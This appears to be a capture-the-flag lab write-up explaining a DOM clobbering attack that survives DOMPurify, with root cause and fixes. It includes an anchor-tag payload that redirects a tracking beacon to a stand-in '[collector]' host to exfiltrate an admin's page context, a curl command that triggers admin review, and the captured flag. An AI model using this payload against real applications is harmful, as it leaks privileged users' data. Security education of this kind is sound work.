# Doppelganger trackerConfig DOM Clobbering

## What Is Happening

The [Doppelganger lab](https://a238f35722c0.pwnbox-lab.com/) is a personal widget board. Users sign in, create widgets with HTML bodies, and can send a widget to an admin for review.

Each widget page sanitizes the HTML with DOMPurify, inserts it into the DOM, then immediately runs a built-in tracking beacon:

```javascript
const tracker = window.trackerConfig || { endpoint: '/api/ping' }
new Image().src = String(tracker.endpoint) + '?d=' + encodeURIComponent(JSON.stringify(window.__ctx || {}))
```

The bug is not XSS inside the snippet. Attacker HTML clobbers `window.trackerConfig` so that beacon points at an external collector and leaks serialized `window.__ctx`.

## Why It Happens

DOMPurify allows structural markup such as anchors with `id` attributes. After sanitized HTML is mounted, duplicate `id` values register on `window`:

```html
<a id="trackerConfig"></a>
<a id="trackerConfig" name="endpoint" href="https://[collector]"></a>
```

In the browser:

- `window.trackerConfig` becomes an `HTMLCollection`
- `tracker.endpoint` is the second anchor (via `name="endpoint"`)
- `String(tracker.endpoint)` becomes the anchor's `href`

The page's own script then requests:

```text
https://[collector]?d=<JSON of window.__ctx>
```

When an admin reviews the widget, `window.__ctx` contains privileged data including the flag.

## Exact Test

Create a widget with:

```html
<a id="trackerConfig"></a><a id="trackerConfig" name="endpoint" href="https://[collector]"></a>
```

Send it to admin:

```bash
curl -sS -X POST "https://a238f35722c0.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"id":"<widgetId>"}'
```

## Expected Signal

- Collector receives a GET from the lab origin after admin visit.
- Query parameter `d` decodes to JSON containing the flag field.
- No script tags or event handlers are required in the widget body.

## Result Interpretation

Confirmed exploit chain:

```text
sanitized HTML clobbers window.trackerConfig
-> built-in Image beacon uses attacker href
-> window.__ctx serialized into query string
-> admin review populates flag in __ctx
-> flag exfiltrated to collector
```

Observed admin beacon payload:

```json
{"flag":"pwnbox{6e958fb35af1995336d35acca008ee5e}"}
```

## Root Cause

The application treated DOMPurify output as sufficient protection while still reading attacker-influenced globals immediately afterward. Privileged review context was also exposed in a client-side global on the same page.

## Impact

- Disclosure of admin-only secrets without JavaScript execution in the snippet.
- In real apps: analytics hijacking, blind data exfil from privileged views, or leakage of internal JSON context.

## Fix

- Do not read `window.trackerConfig` (or similar) after mounting user HTML.
- Hardcode beacon endpoints in module scope.
- Keep admin/reviewer secrets off pages that render user-controlled HTML.
- Treat post-sanitize global lookups as a separate security review surface from sanitization itself.

## Key Lesson

`DOMPurify.sanitize` does not protect `window`. If trusted code runs after user HTML is inserted and reads ambient globals, DOM clobbering can turn a "safe" widget into an exfil primitive.

## Flag

`pwnbox{6e958fb35af1995336d35acca008ee5e}`
